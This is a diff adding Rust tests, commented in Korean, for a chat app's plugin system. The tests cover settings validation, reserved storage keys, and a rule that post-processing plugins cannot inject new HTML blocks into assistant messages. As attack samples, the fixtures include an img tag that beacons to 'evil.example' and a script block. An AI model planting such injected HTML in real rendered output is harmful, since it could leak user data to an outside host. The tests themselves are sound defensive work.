@@ -526,6 +526,177 @@ async fn ai_policy_caps_switch_and_limits() {
     runtime::stop_all();
 }
 
+#[tokio::test]
+async fn plugin_settings_form_values_and_reserved_keys() {
+    use super::manifest::PluginSettingField;
+    let _g = LOCK.lock().await;
+    let (d, base, db) = app_dir().await;
+    let field = |key: &str, kind: &str, default: Option<Value>, options: &[&str]| PluginSettingField {
+        key: key.into(),
+        kind: kind.into(),
+        label: key.into(),
+        description: None,
+        default,
+        options: options.iter().map(|s| s.to_string()).collect(),
+    };
+    let decl = vec![
+        field("name", "text", Some(json!("기본")), &[]),
+        field("limit", "number", None, &[]),
+        field("on", "toggle", Some(json!(true)), &[]),
+        field("mode", "select", None, &["a", "b"]),
+    ];
+    // 플러그인 행이 있어야 저장소가 이어진다 (FK)
+    add(&db, &base, d.path(), "st-a", &["storage"], true).await;
+    run_start(&db, &base).await;
+
+    // 아무것도 안 정했으면 기본값
+    assert_eq!(
+        settings::get(&db, "st-a", &decl).await.unwrap(),
+        json!({ "name": "기본", "limit": 0, "on": true, "mode": "a" })
+    );
+    // 종류에 맞는 값만, 선언한 칸만
+    settings::set(&db, "st-a", &decl, "limit", &json!(3.5)).await.unwrap();
+    settings::set(&db, "st-a", &decl, "mode", &json!("b")).await.unwrap();
+    settings::set(&db, "st-a", &decl, "on", &json!(false)).await.unwrap();
+    assert!(settings::set(&db, "st-a", &decl, "mode", &json!("c")).await.is_err());
+    assert!(settings::set(&db, "st-a", &decl, "limit", &json!("많이")).await.is_err());
+    assert!(settings::set(&db, "st-a", &decl, "on", &json!("yes")).await.is_err());
+    assert!(settings::set(&db, "st-a", &decl, "name", &json!("x".repeat(3000))).await.is_err());
+    assert!(settings::set(&db, "st-a", &decl, "nope", &json!(1)).await.is_err());
+    assert_eq!(
+        settings::get(&db, "st-a", &decl).await.unwrap(),
+        json!({ "name": "기본", "limit": 3.5, "on": false, "mode": "b" })
+    );
+    // 플러그인이 보는 값 (settings.get, 권한 없이)
+    assert_eq!(
+        call(&db, "st-a", "settings.get", &Value::Null).await.unwrap(),
+        json!({}),
+        "선언이 없는 도는 플러그인은 빈 객체"
+    );
+    // null이면 기본값으로
+    settings::set(&db, "st-a", &decl, "mode", &Value::Null).await.unwrap();
+    assert_eq!(settings::get(&db, "st-a", &decl).await.unwrap()["mode"], "a");
+    // 선언이 바뀌어 종류가 안 맞는 옛 값은 기본값
+    let changed = vec![field("limit", "toggle", None, &[])];
+    assert_eq!(settings::get(&db, "st-a", &changed).await.unwrap(), json!({ "limit": false }));
+
+    // 예약 키는 플러그인의 storage API로 읽거나 쓸 수 없다. 키 목록에도 안 보인다
+    assert!(call(&db, "st-a", "storage.get", &json!({ "key": "__settings" })).await.is_err());
+    assert!(call(&db, "st-a", "storage.set", &json!({ "key": "__settings", "value": { "limit": 99 } }))
+        .await
+        .is_err());
+    assert!(call(&db, "st-a", "storage.delete", &json!({ "key": "__settings" })).await.is_err());
+    call(&db, "st-a", "storage.set", &json!({ "key": "mine", "value": 1 })).await.unwrap();
+    assert_eq!(call(&db, "st-a", "storage.keys", &Value::Null).await.unwrap(), json!(["mine"]));
+    runtime::stop_all();
+}
+
+#[tokio::test]
+async fn postprocess_refuses_new_html_blocks_and_settings_survive_a_full_store() {
+    use super::postprocess::{self, PluginNote, PostProcessResult};
+    let _g = LOCK.lock().await;
+    let (d, base, db) = app_dir().await;
+    add(&db, &base, d.path(), "hb-fix", &["messages.process", "storage"], true).await;
+    postprocess::set_mode(&db, "hb-fix", "fix").await.unwrap();
+    run_start(&db, &base).await;
+    let fix = || PostProcessResult {
+        plugin_id: "hb-fix".into(),
+        changed: true,
+        notes: vec![PluginNote {
+            level: "info".into(),
+            text: "x".into(),
+        }],
+    };
+    let put = |id: &str, text: &str| {
+        let db = db.clone();
+        let (id, text) = (id.to_string(), text.to_string());
+        async move {
+            sqlx::query("INSERT INTO conversations (id, title) VALUES ('hv', 'c') ON CONFLICT DO NOTHING")
+                .execute(&db)
+                .await
+                .unwrap();
+            sqlx::query("INSERT INTO messages (id, conversation_id, seq, role, content) VALUES (?, 'hv', (SELECT COALESCE(MAX(seq), 0) + 1 FROM messages), 'assistant', ?)")
+                .bind(id)
+                .bind(text)
+                .execute(&db)
+                .await
+                .unwrap();
+        }
+    };
+    // 원문에 없던 html 블록을 넣으면 거절 (앱이 그대로 그려 실행될 수 있음)
+    let block = |lang: &str, body: &str| {
+        format!(
+            "```{lang}
+{body}
+```"
+        )
+    };
+    put("h1", "hello").await;
+    let evil = format!(
+        "hello
+{}",
+        block("html", "<img src=\"https://evil.example/?d=1\">")
+    );
+    let err = postprocess::apply(&db, "h1", "hello", &evil, &[fix()]).await.unwrap_err().to_string();
+    assert!(err.contains("HTML 코드 블록"), "{err}");
+    // 언어 표시 없이 태그로 시작하는 블록도 마찬가지, 대문자 HTML·htm도
+    for e in [block("", "<script>1</script>"), block("HTML", "<p>x</p>"), block("htm", "<p>x</p>")] {
+        let e = format!(
+            "hello
+{e}"
+        );
+        assert!(postprocess::apply(&db, "h1", "hello", &e, &[fix()]).await.is_err(), "{e}");
+    }
+    // 원래 있던 html 블록을 그대로 두고 다른 글만 고치는 것은 된다
+    let with_block = format!(
+        "앞
+{}
+뒤",
+        block("html", "<b>있던</b>")
+    );
+    put("h2", &with_block).await;
+    let edited = with_block.replace('뒤', "뒤!");
+    postprocess::apply(&db, "h2", &with_block, &edited, &[fix()]).await.unwrap();
+    // 있던 블록의 내용을 바꾸면 새 블록으로 본다
+    let altered = edited.replace("<b>있던</b>", "<img src=\"https://evil.example\">");
+    assert!(postprocess::apply(&db, "h2", &edited, &altered, &[fix()]).await.is_err());
+    // html이 아닌 코드 블록(닫히지 않은 블록 닫기 같은 것)은 괜찮다
+    let open_py = String::from(
+        "```python
+print(1)",
+    );
+    put("h3", &open_py).await;
+    let closed = format!(
+        "{open_py}
+```"
+    );
+    postprocess::apply(&db, "h3", &open_py, &closed, &[fix()]).await.unwrap();
+
+    // 저장소를 가득 채워도 사용자의 설정 저장은 된다 (예약 키는 몫에 세지 않음)
+    sqlx::query("INSERT INTO user_plugin_storage (plugin_id, key, value) VALUES ('hb-fix', 'fill', ?)")
+        .bind("x".repeat(storage::MAX_TOTAL_BYTES as usize - 10))
+        .execute(&db)
+        .await
+        .unwrap();
+    assert!(
+        call(&db, "hb-fix", "storage.set", &json!({ "key": "more", "value": "y".repeat(100) }))
+            .await
+            .is_err(),
+        "가득 참"
+    );
+    let decl = vec![super::manifest::PluginSettingField {
+        key: "k".into(),
+        kind: "text".into(),
+        label: "k".into(),
+        description: None,
+        default: None,
+        options: vec![],
+    }];
+    settings::set(&db, "hb-fix", &decl, "k", &json!("저장됨")).await.unwrap();
+    assert_eq!(settings::get(&db, "hb-fix", &decl).await.unwrap()["k"], "저장됨");
+    runtime::stop_all();
+}
+
 #[test]
 fn every_api_permission_is_a_known_permission() {
     for (m, p) in runtime::API {
